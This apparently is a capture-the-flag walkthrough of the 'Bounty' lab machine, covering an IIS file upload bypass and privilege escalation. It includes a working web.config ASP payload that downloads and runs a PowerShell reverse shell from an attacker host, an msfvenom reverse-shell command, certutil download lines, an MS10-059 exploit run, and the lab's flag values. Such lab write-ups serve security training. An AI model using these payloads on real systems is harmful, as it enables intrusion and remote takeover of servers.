# Bounty

IP: `10.10.10.93`

## Enumerattion

Only port 80 is open according to nmap. It is running on mirosoft IIS 7.5.

There's also an interesting file at the path `http://10.10.10.93/transfer.aspx` where we can upload files.

Trying to upload a random `.txt` file didn't work however, so it seems like the options are rather limited.

Trying out a few file formats, we find that uploading files with an extension of `.jpg` is allowed.

And with gobuster, we see that the path `http://10.10.10.93/uploadedfiles/` is where our uploaded files will be at.

Our first image path is `http://10.10.10.93/uploadedfiles/482732.jpg` and it returns our image.

interestingly enough, after a few minutes the file is garbled up and unviewable. This might be something that the garbage collection for the web app is cleaning up files.

Additionally, we can also upload `.config` files, so we can upload something like `web.config` and make it run `asp` code for us.


So we use the following web.config code:

```asp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
Set cmd = objShell.Exec("cmd /c powershell -c IEX (New-Object Net.WebClient).downloadstring('http://10.10.14.27/mini-reverse.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

while serving a powerscript reverse shell file on 80 and a listerner on 443 and we get back a reverse shell as `bounty\merlin`

user.txt: `e29ad89891462e0b09741e3082f44a2f`

## Foothold

We upload a shell to `C:\Users\merlin\Desktop` and execute that to get another shell this time with more output

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=5555 -f exe > shell.exe
```

```cmd
certutil.exe -urlcache -split -f "http://10.10.14.27/shell.exe" C:\Users\merlin\Desktop\shell.exe
```

## Priv esc

We see that ms10-059 is available.

```cmd
certutil.exe -urlcache -split -f "http://10.10.14.27/MS10-059.exe" C:\Users\merlin\Desktop\MS10-059.exe
```

```cmd
C:\Users\merlin\Desktop>MS10-059.exe 10.10.14.27 6666
```

and listening on port `6666`, we get back a root shell.

root.txt: `c837f7b699feef5475a0c079f9d4f5ea`
